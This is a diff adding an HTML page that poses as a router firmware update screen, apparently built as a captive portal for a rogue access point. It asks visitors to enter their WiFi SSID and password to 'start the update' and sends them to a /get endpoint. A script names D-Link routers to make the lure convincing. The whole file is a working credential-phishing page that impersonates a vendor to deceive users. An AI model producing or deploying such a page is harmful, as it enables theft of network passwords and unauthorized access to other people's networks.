@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #FC4F00;
+  margin-right: 100px
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FC4F00;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+h2 {
+  text-align: center; 
+  font-size: 24px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #FC4F00;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #FC4F00;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+  margin-top: 20px;
+}
+
+.submit-btn:hover {
+  background: #FC4F00;
+}
+
+.forgot-password {
+  display: block;
+  text-align: center;
+  color: #000000;
+  text-decoration: underline;
+  margin-top: 10px;
+}
+
+.error-message {
+  color: #000000;
+  text-align: center;
+  display: none; 
+  margin-top: 10px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="326.000000pt" height="155.000000pt" viewBox="0 0 326.000000 155.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,155.000000) scale(0.100000,-0.100000)"
+fill="#FC4F00" stroke="none">
+<path d="M2425 1148 c-3 -7 -15 -53 -28 -103 l-23 -90 -124 -6 c-132 -7 -160
+-13 -226 -48 -83 -44 -124 -111 -124 -206 0 -90 37 -136 127 -156 44 -10 66
+-9 130 5 42 9 79 18 80 20 2 2 -24 7 -59 10 -107 13 -138 41 -138 127 0 72 36
+135 94 165 31 16 182 32 209 21 11 -4 5 -39 -29 -173 -30 -122 -39 -171 -31
+-176 36 -23 126 3 147 43 9 16 150 557 150 575 0 2 -34 4 -75 4 -51 0 -77 -4
+-80 -12z"/>
+<path d="M213 1001 c-8 -7 -13 -23 -11 -35 3 -20 8 -21 86 -18 45 2 100 1 121
+-3 l38 -6 -48 -187 c-27 -103 -49 -194 -49 -203 0 -14 13 -17 89 -18 l90 -1 9
+32 c5 18 19 76 32 128 13 52 33 131 44 174 l21 80 100 26 c55 15 107 29 115
+32 8 4 -129 8 -304 10 -261 2 -322 0 -333 -11z"/>
+<path d="M1027 970 c-118 -20 -248 -88 -333 -174 -55 -56 -74 -92 -76 -149 -4
+-114 200 -151 417 -75 57 20 158 79 171 100 15 24 -12 19 -79 -15 -96 -49
+-184 -70 -265 -65 -56 4 -68 8 -89 33 -19 22 -23 35 -19 58 3 17 8 33 11 35 3
+3 49 9 103 13 104 8 233 44 283 79 15 11 31 20 36 20 11 1 63 70 63 86 0 50
+-101 74 -223 54z m64 -50 c30 -16 23 -54 -15 -88 -40 -34 -110 -60 -185 -68
+-99 -9 -115 13 -53 73 72 71 198 112 253 83z"/>
+<path d="M1336 971 c-4 -5 -10 -29 -15 -53 -5 -24 -24 -104 -44 -178 -19 -74
+-37 -151 -39 -170 l-3 -35 57 -3 c82 -4 91 4 112 95 51 219 95 277 216 285 49
+2 78 -16 85 -55 6 -28 -39 -254 -62 -312 -5 -14 5 -16 74 -14 l80 2 17 66 c40
+154 47 189 53 245 5 57 5 59 -30 91 -29 27 -46 34 -99 39 -79 8 -156 -6 -214
+-40 l-45 -27 6 35 7 35 -75 2 c-41 1 -78 -2 -81 -8z"/>
+<path d="M2750 965 c-73 -16 -106 -33 -126 -63 -16 -24 -16 -25 2 -17 50 22
+162 45 190 40 37 -6 49 -19 56 -58 6 -32 2 -33 -113 -41 -117 -7 -198 -49
+-238 -124 -32 -60 7 -130 88 -157 69 -23 341 -21 341 3 0 8 6 38 14 66 42 147
+56 208 51 216 -3 5 -1 11 5 15 19 12 10 55 -17 85 -43 47 -142 61 -253 35z
+m97 -197 c-3 -13 -13 -58 -24 -100 l-18 -78 -57 0 c-75 0 -111 27 -108 83 2
+66 4 76 13 70 4 -3 16 2 25 10 26 22 72 35 126 36 45 1 48 0 43 -21z"/>
+</g>
+</svg>
+
+
+
+
+
+  </div>
+
+  <div class="form-container">
+  <center><h1><b>Your router needs to be updated before it can restart</b></h1>
+  <h2>Connect to your WiFi to start the update</h2>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="SSID" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+	    <a href="javascript:void(0);" class="forgot-password">Where can I find my SSID?</a>
+			<div class="error-message"></div>
+      <button class="submit-btn" type="submit"><b>UPDATE</b></button>
+
+    </form>
+
+  </div>
+
+</div>
+<script>
+  document.querySelector('.forgot-password').addEventListener('click', function() {
+    var errorMessage = document.querySelector('.error-message');
+    errorMessage.innerHTML = "The SSID, or Service Set Identifier, represents your WiFi network's official name. If you haven't previously set a custom name, the default SSID (and password) can be located on the back panel of your D-Link router.";
+    errorMessage.style.display = 'block';
+  });
+</script>
+</meta>
+</body>
+</html>
